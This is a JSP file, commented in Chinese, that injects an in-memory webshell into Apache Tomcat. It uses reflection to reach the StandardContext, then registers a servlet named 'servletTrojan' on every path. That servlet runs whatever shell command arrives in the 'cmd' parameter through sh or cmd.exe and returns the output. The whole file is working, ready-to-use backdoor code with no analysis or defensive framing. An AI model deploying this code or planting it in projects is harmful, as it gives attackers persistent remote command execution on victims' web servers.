<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>

<%
    // 获取 standardContext
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    final Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();

    // 自定义恶意 Servlet
    HttpServlet servlet = new HttpServlet() {
        @Override
        protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }
    };

    // 创建 Wrapper,并初始化对应设置
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("servletTrojan");
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servlet);
    wrapper.setServletClass(HttpServlet.class.getName());

    // 将 Wrapper 添加到 Context,并设置映射
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/*", "servletTrojan");

    out.println("inject done!");
    out.flush();
%>